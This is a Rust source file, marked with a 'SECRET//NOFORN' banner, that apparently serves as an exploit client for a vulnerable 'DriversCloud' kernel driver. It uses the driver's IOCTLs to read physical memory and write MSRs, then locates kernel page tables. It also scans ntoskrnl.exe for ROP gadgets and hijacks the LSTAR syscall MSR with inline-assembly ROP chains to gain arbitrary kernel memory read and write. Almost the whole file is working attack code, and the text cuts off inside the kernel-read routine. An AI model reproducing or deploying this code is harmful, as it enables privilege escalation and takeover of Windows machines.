/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

// DriversCloud - client for the DriversCloud kernel driver
// Device: \\.\DriversCloud_amd64
//
// IOCTLs (METHOD_BUFFERED):
//   0x80ff2010 - PhysMemRead: read physical memory via MmMapIoSpace
//   0x80ff2024 - MSR Read:    rdmsr
//   0x80ff2040 - MSR Write:   wrmsr
//   0x80ff2000 - Port Read:   in dx, al/ax/eax
//   0x80ff2004 - Port Write:  out dx, al/ax/eax
//   0x80ff2020 - PCI Write:   HalSetBusDataByOffset

#![allow(non_snake_case, dead_code)]

use anyhow::{bail, Context, Result};
use clap::{Parser, Subcommand};
use thiserror::Error;

use windows_sys::Wdk::System::SystemInformation::NtQuerySystemInformation;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::CreateFileW;
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::Threading::{GetCurrentThread, SetThreadAffinityMask, SetThreadPriority};

// ── Constants ────────────────────────────────────────────────────────────────

const DEVICE_PATH: &str = "\\\\.\\DriversCloud_amd64";

const PHYS_BUF_SIZE: usize = 0x1e8498;
const PHYS_MAX_READ: u32   = 0x1e8480;

const IOCTL_PHYS_READ: u32 = 0x80ff2010;
const IOCTL_MSR_READ:  u32 = 0x80ff2024;
const IOCTL_MSR_WRITE: u32 = 0x80ff2040;

const MSR_LSTAR: u32 = 0xC000_0082; // KiSystemCall64
const MSR_FMASK: u32 = 0xC000_0084; // SYSCALL flag mask

const THREAD_PRIORITY_TIME_CRITICAL: i32 = 15;
const THREAD_PRIORITY_NORMAL:        i32 = 0;

const GENERIC_READ_WRITE: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;

const PT_MASK: u64 = 0x000F_FFFF_FFFF_F000;

// ── Errors ───────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
enum DcError {
    #[error("device open failed ({path}): WinErr={winerr}")]
    DeviceOpen { path: String, winerr: u32 },
    #[error("IOCTL 0x{code:08X} failed: WinErr={winerr}")]
    Ioctl { code: u32, winerr: u32 },
    #[error("NtQuerySystemInformation failed: NTSTATUS=0x{0:08X}")]
    NtQuery(i32),
}

// ── Device handle ────────────────────────────────────────────────────────────

struct Device {
    h: HANDLE,
}

impl Device {
    fn open(path: &str) -> Result<Self> {
        let wide = to_wide(path);
        let h = unsafe {
            CreateFileW(
                wide.as_ptr(),
                GENERIC_READ_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        if h == INVALID_HANDLE_VALUE {
            bail!(DcError::DeviceOpen {
                path: path.to_string(),
                winerr: unsafe { GetLastError() },
            });
        }
        Ok(Self { h })
    }

    fn ioctl(&self, code: u32, buf: &mut [u8]) -> Result<u32> {
        let mut returned: u32 = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.h,
                code,
                buf.as_ptr() as *const _,
                buf.len() as u32,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut returned,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            bail!(DcError::Ioctl { code, winerr: unsafe { GetLastError() } });
        }
        Ok(returned)
    }
}

impl Drop for Device {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.h); }
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn parse_hex_or_dec(s: &str) -> Result<u64> {
    if let Some(h) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u64::from_str_radix(h, 16).context("invalid hex number")
    } else {
        s.parse::<u64>().context("invalid number")
    }
}

// ── PhysMemRead ──────────────────────────────────────────────────────────────
//
// Buffer layout:
//   [0..4]  u32 LE  physical address (driver zero-extends to u64 - 32-bit PA only)
//   [4..8]  u32 LE  byte_count (in); capped to PHYS_MAX_READ; on return: bytes read
//   [8..]   BYTE[]  output data

fn phys_read(dev: &Device, pa: u64, count: u32) -> Option<Vec<u8>> {
    if pa > u32::MAX as u64 { return None; }
    let count = count.min(PHYS_MAX_READ);
    let mut buf = vec![0u8; PHYS_BUF_SIZE];
    buf[0..4].copy_from_slice(&(pa as u32).to_le_bytes());
    buf[4..8].copy_from_slice(&count.to_le_bytes());
    dev.ioctl(IOCTL_PHYS_READ, &mut buf).ok()?;
    let actual = u32::from_le_bytes(buf[4..8].try_into().unwrap()) as usize;
    Some(buf[8..8 + actual].to_vec())
}

fn phys_read_result(dev: &Device, pa: u64, count: u32) -> Result<Vec<u8>> {
    phys_read(dev, pa, count).with_context(|| format!("phys_read PA=0x{:X}", pa))
}

fn rd_u64(dev: &Device, pa: u64) -> Option<u64> {
    phys_read(dev, pa, 8).and_then(|b| b.get(..8).map(|s| u64::from_le_bytes(s.try_into().unwrap())))
}

fn rd_u32(dev: &Device, pa: u64) -> Option<u32> {
    phys_read(dev, pa, 4).and_then(|b| b.get(..4).map(|s| u32::from_le_bytes(s.try_into().unwrap())))
}

fn rd_u16(dev: &Device, pa: u64) -> Option<u16> {
    phys_read(dev, pa, 2).and_then(|b| b.get(..2).map(|s| u16::from_le_bytes(s.try_into().unwrap())))
}

// ── MSR Read ─────────────────────────────────────────────────────────────────
//
// Buffer layout (minimum 0xd = 13 bytes):
//   [+0]  u32  MSR index (in)
//   [+4]  u32  result_low (out)
//   [+8]  u32  result_high (out)
//   [+C]  u8   status (out)

fn msr_read(dev: &Device, msr: u32) -> Result<u64> {
    let mut buf = vec![0u8; 0x10]; // slightly over minimum for alignment
    buf[0..4].copy_from_slice(&msr.to_le_bytes());
    dev.ioctl(IOCTL_MSR_READ, &mut buf)?;
    let lo = u32::from_le_bytes(buf[4..8].try_into().unwrap()) as u64;
    let hi = u32::from_le_bytes(buf[8..12].try_into().unwrap()) as u64;
    Ok((hi << 32) | lo)
}

// ── MSR Write ────────────────────────────────────────────────────────────────
//
// Buffer layout (minimum 0xd = 13 bytes):
//   [+0]  u32  MSR index (in)
//   [+4]  u32  value_low (in)
//   [+8]  u32  value_high (in)
//   [+C]  u8   error (out); 0 = success

fn msr_write(dev: &Device, msr: u32, value: u64) -> Result<()> {
    let mut buf = vec![0u8; 0x10];
    buf[0..4].copy_from_slice(&msr.to_le_bytes());
    buf[4..8].copy_from_slice(&(value as u32).to_le_bytes());
    buf[8..12].copy_from_slice(&((value >> 32) as u32).to_le_bytes());
    dev.ioctl(IOCTL_MSR_WRITE, &mut buf)?;
    let err_byte = buf[0x0C];
    if err_byte != 0 {
        bail!("wrmsr MSR=0x{:08X} driver error=0x{:02X}", msr, err_byte);
    }
    Ok(())
}

// ── Kernel module enumeration ─────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct KernelMod {
    va:   u64,
    size: u32,
    name: String,
}

fn get_kernel_modules() -> Result<Vec<KernelMod>> {
    let mut buf = vec![0u8; 0x10_0000];
    let mut ret: u32 = 0;
    let status = unsafe {
        NtQuerySystemInformation(11, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut ret)
    };
    if status != 0 { bail!(DcError::NtQuery(status)); }
    let count = u32::from_le_bytes(buf[0..4].try_into()?) as usize;
    if count == 0 || count > 1000 { bail!("bad module count: {}", count); }
    const ENTRY: usize = 0x128;
    const BASE: usize = 8;
    let mut mods = Vec::new();
    for i in 0..count {
        let off = BASE + i * ENTRY;
        if off + ENTRY > buf.len() { break; }
        let va   = u64::from_le_bytes(buf[off + 0x10..off + 0x18].try_into()?);
        let size = u32::from_le_bytes(buf[off + 0x18..off + 0x1C].try_into()?);
        let pb   = &buf[off + 0x28..off + 0x28 + 256];
        let nul  = pb.iter().position(|&b| b == 0).unwrap_or(256);
        let path = String::from_utf8_lossy(&pb[..nul]).to_string();
        let name = path.split('\\').last().unwrap_or("").to_ascii_lowercase();
        mods.push(KernelMod { va, size, name });
    }
    Ok(mods)
}

fn find_mod<'a>(mods: &'a [KernelMod], names: &[&str]) -> Option<&'a KernelMod> {
    mods.iter().find(|m| names.iter().any(|n| m.name == *n))
}

fn walk_page_table(dev: &Device, cr3: u64, va: u64) -> Option<u64> {
    let pml4e = rd_u64(dev, (cr3 & PT_MASK) + ((va >> 39) & 0x1FF) * 8)?;
    if pml4e & 1 == 0 { return None; }

    let pdpte = rd_u64(dev, (pml4e & PT_MASK) + ((va >> 30) & 0x1FF) * 8)?;
    if pdpte & 1 == 0 { return None; }
    if pdpte & 0x80 != 0 {
        return Some((pdpte & 0x000F_FFFF_FFC0_0000) + (va & 0x3FFF_FFFF));
    }

    let pde = rd_u64(dev, (pdpte & PT_MASK) + ((va >> 21) & 0x1FF) * 8)?;
    if pde & 1 == 0 { return None; }
    if pde & 0x80 != 0 {
        return Some((pde & 0x000F_FFFF_FFE0_0000) + (va & 0x1F_FFFF));
    }

    let pte = rd_u64(dev, (pde & PT_MASK) + ((va >> 12) & 0x1FF) * 8)?;
    if pte & 1 == 0 { return None; }
    Some((pte & PT_MASK) + (va & 0xFFF))
}

const PA_MAX: u64 = 0x0001_0000_0000_0000;

fn find_cr3_for_va(dev: &Device, nt_va: u64, nt_size: u32, lstar_va: u64) -> Option<(u64, u64)> {
    let pml4_idx    = (nt_va >> 39) & 0x1FF;
    let pml4_off    = (pml4_idx * 8) as usize;
    const SCAN_END: u64 = 0x2000_0000;

    let mut addr = 0x1000u64;
    while addr < SCAN_END {
        let chunk = match phys_read(dev, addr, PHYS_MAX_READ) {
            Some(d) => d,
            None => { addr += PHYS_MAX_READ as u64; continue; }
        };

        let mut off = 0usize;
        while off + 0x1000 <= chunk.len() {
            if pml4_off + 8 <= 0x1000 {
                let e = u64::from_le_bytes(chunk[off + pml4_off..off + pml4_off + 8].try_into().unwrap());
                if e & 1 != 0 {
                    let pdpt_base = e & PT_MASK;
                    if pdpt_base > 0 && pdpt_base < PA_MAX {
                        let page_pa = addr + off as u64;
                        if let Some(nt_pa) = walk_page_table(dev, page_pa, nt_va) {
                            if nt_pa > 0 && nt_pa < PA_MAX {
                                if let Some(lstar_pa) = walk_page_table(dev, page_pa, lstar_va) {
                                    if lstar_pa > 0 && lstar_pa < PA_MAX
                                        && lstar_pa.wrapping_sub(nt_pa) <= nt_size as u64
                                    {
                                        return Some((page_pa, nt_pa));
                                    }
                                }
                            }
                        }
                    }
                }
            }
            off += 0x1000;
        }

        addr += PHYS_MAX_READ as u64;
    }
    None
}

// ── ROP gadget scanner ────────────────────────────────────────────────────────
//
// Reads ntoskrnl.exe from disk, iterates executable PE sections, and scans
// for each gadget byte pattern. Returns VAs adjusted by the KASLR slide
// (runtime_base - preferred_image_base).

#[derive(Debug, Copy, Clone, PartialEq)]
pub enum ReadReg {
    Rax, Rdx, R8, R9
}

#[derive(Debug, Default)]
struct Gadgets {
    pub write_mem: Option<u64>, // mov [rdx],rax; ret  (48 89 02 C3)
    pub read_mem:  Option<(u64, ReadReg)>, // mov rax,[reg]; ret
    pub pop_rcx:   Option<u64>, // pop rcx; ret        (59 C3)
    pub pop_rax:   Option<u64>, // pop rax; ret        (58 C3)
    pub pop_rdx:   Option<u64>, // pop rdx; ret        (5A C3)
    pub wrmsr_ret: Option<u64>, // wrmsr; ret          (0F 30 C3)
    pub iretq:     Option<u64>, // iretq               (48 CF)
}

impl Gadgets {
    fn all_found(&self) -> bool {
        self.write_mem.is_some()
            && self.read_mem.is_some()
            && self.pop_rcx.is_some()
            && self.pop_rax.is_some()
            && self.pop_rdx.is_some()
            && self.wrmsr_ret.is_some()
            && self.iretq.is_some()
    }
}

struct GadgetPattern {
    bytes: &'static [u8],
    name:  &'static str,
}

static PATTERNS: &[GadgetPattern] = &[
    GadgetPattern { bytes: &[0x48, 0x89, 0x02, 0xC3], name: "write_mem" },
    GadgetPattern { bytes: &[0x48, 0x8B, 0x00, 0xC3], name: "read_mem_rax" },
    GadgetPattern { bytes: &[0x48, 0x8B, 0x02, 0xC3], name: "read_mem_rdx" },
    GadgetPattern { bytes: &[0x49, 0x8B, 0x00, 0xC3], name: "read_mem_r8" },
    GadgetPattern { bytes: &[0x49, 0x8B, 0x01, 0xC3], name: "read_mem_r9" },
    GadgetPattern { bytes: &[0x59, 0xC3],              name: "pop_rcx; ret" },
    GadgetPattern { bytes: &[0x58, 0xC3],              name: "pop_rax; ret" },
    GadgetPattern { bytes: &[0x5A, 0xC3],              name: "pop_rdx; ret" },
    GadgetPattern { bytes: &[0x0F, 0x30, 0xC3],        name: "wrmsr; ret" },
    GadgetPattern { bytes: &[0x48, 0xCF],              name: "iretq" },
];

fn scan_section_for_pattern(data: &[u8], pat: &[u8]) -> Option<usize> {
    data.windows(pat.len()).position(|w| w == pat)
}

fn scan_gadgets_in_pe(pe_bytes: &[u8], runtime_base: u64) -> Result<Gadgets> {
    // DOS header
    if pe_bytes.len() < 0x40 { bail!("PE too small for DOS header"); }
    if pe_bytes[0..2] != [0x4D, 0x5A] { bail!("not a valid PE (bad MZ)"); }
    let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into()?) as usize;
    if e_lfanew + 24 + 2 > pe_bytes.len() { bail!("e_lfanew out of bounds"); }

    // PE signature
    if pe_bytes[e_lfanew..e_lfanew + 4] != [0x50, 0x45, 0x00, 0x00] { bail!("bad PE signature"); }

    let num_sections     = u16::from_le_bytes(pe_bytes[e_lfanew + 6..e_lfanew + 8].try_into()?) as usize;
    let opt_hdr_size     = u16::from_le_bytes(pe_bytes[e_lfanew + 20..e_lfanew + 22].try_into()?) as usize;

    // Optional header (PE32+ only)
    let opt_off = e_lfanew + 24;
    if opt_off + 2 > pe_bytes.len() { bail!("optional header missing"); }
    let magic = u16::from_le_bytes(pe_bytes[opt_off..opt_off + 2].try_into()?);
    if magic != 0x020B { bail!("not PE32+ (magic=0x{:04X})", magic); }

    let preferred_base = u64::from_le_bytes(pe_bytes[opt_off + 24..opt_off + 32].try_into()?);
    let slide = runtime_base.wrapping_sub(preferred_base);

    // Section headers
    let sec_table_off = opt_off + opt_hdr_size;
    const SEC_HDR: usize = 40;
    let mut gadgets = Gadgets::default();

    for i in 0..num_sections {
        let sh = sec_table_off + i * SEC_HDR;
        if sh + SEC_HDR > pe_bytes.len() { break; }

        let characteristics = u32::from_le_bytes(pe_bytes[sh + 36..sh + 40].try_into()?);
        // IMAGE_SCN_MEM_EXECUTE
        if characteristics & 0x2000_0000 == 0 { continue; }

        let virtual_address   = u32::from_le_bytes(pe_bytes[sh + 12..sh + 16].try_into()?) as usize;
        let size_of_raw_data  = u32::from_le_bytes(pe_bytes[sh + 16..sh + 20].try_into()?) as usize;
        let ptr_to_raw_data   = u32::from_le_bytes(pe_bytes[sh + 20..sh + 24].try_into()?) as usize;

        if ptr_to_raw_data + size_of_raw_data > pe_bytes.len() { continue; }
        let section = &pe_bytes[ptr_to_raw_data..ptr_to_raw_data + size_of_raw_data];

        for pat in PATTERNS {
            if let Some(off) = scan_section_for_pattern(section, pat.bytes) {
                let rva = virtual_address + off;
                let va  = runtime_base.wrapping_add(rva as u64);
                let _ = slide; // used via wrapping_add above
                match pat.name {
                    "write_mem" => { gadgets.write_mem.get_or_insert(va); }
                    "read_mem_rax" if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::Rax)); }
                    "read_mem_rdx" if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::Rdx)); }
                    "read_mem_r8"  if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::R8));  }
                    "read_mem_r9"  if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::R9));  }
                    n if n.starts_with("pop_rcx")   => { gadgets.pop_rcx.get_or_insert(va); }
                    n if n.starts_with("pop_rax")   => { gadgets.pop_rax.get_or_insert(va); }
                    n if n.starts_with("pop_rdx")   => { gadgets.pop_rdx.get_or_insert(va); }
                    n if n.starts_with("wrmsr")     => { gadgets.wrmsr_ret.get_or_insert(va); }
                    n if n.starts_with("iretq")     => { gadgets.iretq.get_or_insert(va); }
                    _ => {}
                }
            }
        }
    }

    Ok(gadgets)
}

fn ntoskrnl_disk_path(mods: &[KernelMod]) -> Result<String> {
    let nt = find_mod(mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not in module list")?;
    // NtQuerySystemInformation path is like \SystemRoot\system32\ntoskrnl.exe
    // The path field is at offset 0x28 in the raw entry; we stored just the filename in KernelMod.
    // Re-derive from module list path by finding the ntoskrnl entry's full path.
    // We stored only name; re-enumerate to get full path.
    let sysroot = std::env::var("SYSTEMROOT").unwrap_or_else(|_| "C:\\Windows".to_string());
    Ok(format!("{}\\system32\\{}", sysroot, nt.name))
}

fn cmd_scan_gadgets(mods: &[KernelMod], runtime_base: u64) -> Result<Gadgets> {
    let path = ntoskrnl_disk_path(mods)?;
    println!("[*] reading {} from disk...", path);
    let pe_bytes = std::fs::read(&path)
        .with_context(|| format!("cannot read {}", path))?;
    println!("  [i] {} bytes read, scanning executable sections", pe_bytes.len());

    let gadgets = scan_gadgets_in_pe(&pe_bytes, runtime_base)?;

    println!("[*] gadget scan results:");
    macro_rules! print_gadget {
        ($field:expr, $label:literal) => {
            match $field {
                Some(va) => println!("  [+] {:20} 0x{:016X}", $label, va),
                None     => println!("  [!] {:20} NOT FOUND", $label),
            }
        };
    }
    print_gadget!(gadgets.write_mem, "mov [rdx],rax;ret");
    match gadgets.read_mem {
        Some((va, reg)) => println!("  [+] {:20} 0x{:016X}", format!("mov rax,[{:?}];ret", reg).to_lowercase(), va),
        None            => println!("  [!] {:20} NOT FOUND", "mov rax,[reg];ret"),
    }
    print_gadget!(gadgets.pop_rcx,   "pop rcx;ret");
    print_gadget!(gadgets.pop_rax,   "pop rax;ret");
    print_gadget!(gadgets.pop_rdx,   "pop rdx;ret");
    print_gadget!(gadgets.wrmsr_ret, "wrmsr;ret");
    print_gadget!(gadgets.iretq,     "iretq");

    if gadgets.all_found() {
        println!("[+] all gadgets found");
    } else {
        println!("[!] one or more gadgets missing");
    }

    Ok(gadgets)
}

// ── PE export table lookup ────────────────────────────────────────────────────

fn rva_to_file_offset(pe: &[u8], rva: u32, e_lfanew: usize, num_sections: usize, opt_hdr_size: usize) -> Option<usize> {
    let sec_table_off = e_lfanew + 24 + opt_hdr_size;
    const SEC_HDR: usize = 40;
    for i in 0..num_sections {
        let sh = sec_table_off + i * SEC_HDR;
        if sh + SEC_HDR > pe.len() { break; }
        let virt_addr  = u32::from_le_bytes(pe[sh + 12..sh + 16].try_into().ok()?) as usize;
        let virt_size  = u32::from_le_bytes(pe[sh + 8..sh + 12].try_into().ok()?) as usize;
        let raw_off    = u32::from_le_bytes(pe[sh + 20..sh + 24].try_into().ok()?) as usize;
        let rva_us = rva as usize;
        if rva_us >= virt_addr && rva_us < virt_addr + virt_size {
            return Some(raw_off + (rva_us - virt_addr));
        }
    }
    None
}

fn find_export_va(pe: &[u8], runtime_base: u64, symbol: &str) -> Result<u64> {
    if pe.len() < 0x40 { bail!("PE too small"); }
    if pe[0..2] != [0x4D, 0x5A] { bail!("bad MZ"); }
    let e_lfanew = u32::from_le_bytes(pe[0x3C..0x40].try_into()?) as usize;
    if pe[e_lfanew..e_lfanew + 4] != [0x50, 0x45, 0x00, 0x00] { bail!("bad PE sig"); }

    let num_sections = u16::from_le_bytes(pe[e_lfanew + 6..e_lfanew + 8].try_into()?) as usize;
    let opt_hdr_size = u16::from_le_bytes(pe[e_lfanew + 20..e_lfanew + 22].try_into()?) as usize;
    let opt_off = e_lfanew + 24;

    let magic = u16::from_le_bytes(pe[opt_off..opt_off + 2].try_into()?);
    if magic != 0x020B { bail!("not PE32+"); }

    let preferred_base = u64::from_le_bytes(pe[opt_off + 24..opt_off + 32].try_into()?);
    let slide = runtime_base.wrapping_sub(preferred_base);

    // Export DataDirectory is entry 0: OptionalHeader + 112 for PE32+
    let exp_rva  = u32::from_le_bytes(pe[opt_off + 112..opt_off + 116].try_into()?);
    if exp_rva == 0 { bail!("no export directory"); }

    let exp_off = rva_to_file_offset(pe, exp_rva, e_lfanew, num_sections, opt_hdr_size)
        .context("export dir RVA not mapped to any section")?;
    if exp_off + 40 > pe.len() { bail!("export dir out of bounds"); }

    let num_names       = u32::from_le_bytes(pe[exp_off + 24..exp_off + 28].try_into()?) as usize;
    let addr_funcs_rva  = u32::from_le_bytes(pe[exp_off + 28..exp_off + 32].try_into()?);
    let addr_names_rva  = u32::from_le_bytes(pe[exp_off + 32..exp_off + 36].try_into()?);
    let addr_ords_rva   = u32::from_le_bytes(pe[exp_off + 36..exp_off + 40].try_into()?);

    let names_off = rva_to_file_offset(pe, addr_names_rva, e_lfanew, num_sections, opt_hdr_size)
        .context("AddressOfNames not mapped")?;
    let ords_off  = rva_to_file_offset(pe, addr_ords_rva, e_lfanew, num_sections, opt_hdr_size)
        .context("AddressOfNameOrdinals not mapped")?;
    let funcs_off = rva_to_file_offset(pe, addr_funcs_rva, e_lfanew, num_sections, opt_hdr_size)
        .context("AddressOfFunctions not mapped")?;

    for i in 0..num_names {
        let name_rva_off = names_off + i * 4;
        if name_rva_off + 4 > pe.len() { break; }
        let name_rva = u32::from_le_bytes(pe[name_rva_off..name_rva_off + 4].try_into()?);
        let name_off = rva_to_file_offset(pe, name_rva, e_lfanew, num_sections, opt_hdr_size)
            .context("name RVA not mapped")?;
        let end = pe[name_off..].iter().position(|&b| b == 0).unwrap_or(0) + name_off;
        let name = std::str::from_utf8(&pe[name_off..end]).unwrap_or("");
        if name != symbol { continue; }

        let ord_off = ords_off + i * 2;
        if ord_off + 2 > pe.len() { bail!("ordinal table OOB"); }
        let ordinal = u16::from_le_bytes(pe[ord_off..ord_off + 2].try_into()?) as usize;

        let func_rva_off = funcs_off + ordinal * 4;
        if func_rva_off + 4 > pe.len() { bail!("function table OOB"); }
        let func_rva = u32::from_le_bytes(pe[func_rva_off..func_rva_off + 4].try_into()?);

        return Ok(preferred_base.wrapping_add(func_rva as u64).wrapping_add(slide));
    }

    bail!("symbol '{}' not found in export table", symbol)
}

fn cmd_lookup_export(symbol: &str) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let va = find_export_va(&pe, nt.va, symbol)?;
    println!("[+] {} VA=0x{:016X}", symbol, va);
    Ok(())
}

// ── KernelRW: shared context for LSTAR-hijack kread/kwrite ──────────────────
//
// Setup pins the thread, modifies FMASK, scans gadgets once.
// Each kread/kwrite issues one LSTAR hijack.
// Drop restores FMASK and thread settings.

struct KernelRW<'a> {
    dev:            &'a Device,
    gadgets:        Gadgets,
    lstar_orig:     u64,
    fmask_orig:     u64,
    fmask_modified: bool,
}

impl<'a> KernelRW<'a> {
    fn setup(dev: &'a Device, pe: &[u8], nt_va: u64) -> Result<Self> {
        let gadgets = scan_gadgets_in_pe(pe, nt_va)?;
        if !gadgets.all_found() { bail!("missing ROP gadgets in ntoskrnl.exe"); }

        // Pin to core 0 BEFORE any MSR reads/writes: MSRs are per-core, so all
        // reads and writes must happen on the same core that will execute SYSCALL.
        unsafe {
            let t = GetCurrentThread();
            SetThreadAffinityMask(t, 1);
            SetThreadPriority(t, THREAD_PRIORITY_TIME_CRITICAL);
        }

        let lstar_orig = msr_read(dev, MSR_LSTAR)?;

        let fmask_orig = msr_read(dev, MSR_FMASK)?;
        let fmask_new  = fmask_orig & !(1u64 << 18); // clear AC bit so SYSCALL preserves AC=1
        let fmask_modified = fmask_new != fmask_orig;
        if fmask_modified {
            msr_write(dev, MSR_FMASK, fmask_new)?;
        }

        Ok(Self { dev, gadgets, lstar_orig, fmask_orig, fmask_modified })
    }

    fn teardown(&mut self) {
        if self.fmask_modified {
            msr_write(self.dev, MSR_FMASK, self.fmask_orig).ok();
        }
        unsafe {
            let t = GetCurrentThread();
            SetThreadPriority(t, THREAD_PRIORITY_NORMAL);
            SetThreadAffinityMask(t, !0usize);
        }
    }

    // kwrite: write 8 bytes to an arbitrary kernel VA
    //
    // ROP stack (13 u64):
    //   LSTAR -> write_mem (mov [rdx],rax; ret)  RAX=val, RDX=target
    //   [0] pop_rdx / [1] lstar_hi / [2] pop_rax / [3] lstar_lo
    //   [4] pop_rcx / [5] MSR_LSTAR / [6] wrmsr_ret / [7] iretq
    //   [8] return_rip / [9] CS=0x33 / [10] rflags / [11] user_rsp / [12] SS=0x2b
    #[inline(never)]
    #[allow(named_asm_labels)]
    fn kwrite(&self, target: u64, value: u64) -> Result<()> {
        let lstar_lo = self.lstar_orig & 0xFFFF_FFFF;
        let lstar_hi = self.lstar_orig >> 32;
        let g = &self.gadgets;

        let mut rop = vec![0u64; 13];
        rop[0]  = g.pop_rdx.unwrap();
        rop[1]  = lstar_hi;
        rop[2]  = g.pop_rax.unwrap();
        rop[3]  = lstar_lo;
        rop[4]  = g.pop_rcx.unwrap();
        rop[5]  = MSR_LSTAR as u64;
        rop[6]  = g.wrmsr_ret.unwrap();
        rop[7]  = g.iretq.unwrap();
        // rop[8] = return_rip (filled in asm)
        rop[9]  = 0x33;  // CS
        // rop[10] = rflags (filled in asm)
        // rop[11] = user_rsp (filled in asm)
        rop[12] = 0x2b;  // SS

        let rop_ptr = rop.as_mut_ptr() as u64;
        msr_write(self.dev, MSR_LSTAR, g.write_mem.unwrap())?;

        unsafe {
            std::arch::asm!(
                "leaq .L_kwrite_ret(%rip), %r10",
                "movq %r10, 64({rop})",
                "pushfq",
                "popq %r10",
                "movq %r10, 80({rop})",
                "movq %rsp, 88({rop})",
                "pushfq",
                "popq %r10",
                "orq $0x40000, %r10",
                "pushq %r10",
                "popfq",
                "movq {val}, %rax",
                "movq {tgt}, %rdx",
                "movq {rop}, %rsp",
                "syscall",
                ".L_kwrite_ret:",
                rop = in(reg) rop_ptr,
                val = in(reg) value,
                tgt = in(reg) target,
                out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                options(att_syntax),
            );
        }

        Ok(())
    }

    // kread: read 8 bytes from an arbitrary kernel VA
    //
    // ROP stack (16 u64):
    //   LSTAR -> read_mem (mov rax,[rdx]; ret)  RDX=src_va
    //   [0] pop_rdx / [1] user_buf / [2] write_mem / [3] pop_rdx / [4] lstar_hi
    //   [5] pop_rax / [6] lstar_lo / [7] pop_rcx / [8] MSR_LSTAR / [9] wrmsr_ret / [10] iretq
    //   [11] return_rip / [12] CS / [13] rflags / [14] user_rsp / [15] SS
    #[inline(never)]
    #[allow(named_asm_labels)]
    fn kread(&self, src: u64) -> Result<u64> {
        let lstar_lo = self.lstar_orig & 0xFFFF_FFFF;
        let lstar_hi = self.lstar_orig >> 32;
        let g = &self.gadgets;

        let mut result = 0u64;
        let user_buf   = &mut result as *mut u64 as u64;

        let mut rop = vec![0u64; 16];
        rop[0]  = g.pop_rdx.unwrap();
        rop[1]  = user_buf;
        rop[2]  = g.write_mem.unwrap();
        rop[3]  = g.pop_rdx.unwrap();
        rop[4]  = lstar_hi;
        rop[5]  = g.pop_rax.unwrap();
        rop[6]  = lstar_lo;
        rop[7]  = g.pop_rcx.unwrap();
        rop[8]  = MSR_LSTAR as u64;
        rop[9]  = g.wrmsr_ret.unwrap();
        rop[10] = g.iretq.unwrap();
        // [11] return_rip filled in asm
        rop[12] = 0x33;
        // [13] rflags, [14] user_rsp filled in asm
        rop[15] = 0x2b;

        let rop_ptr = rop.as_mut_ptr() as u64;
        let (read_mem_va, read_reg) = g.read_mem.unwrap();
        msr_write(self.dev, MSR_LSTAR, read_mem_va)?;

        unsafe {
            match read_reg {
                ReadReg::Rax => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_rax(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %rax",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_rax:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::Rdx => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_rdx(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %rdx",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_rdx:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::R8 => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_r8(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %r8",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_r8:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
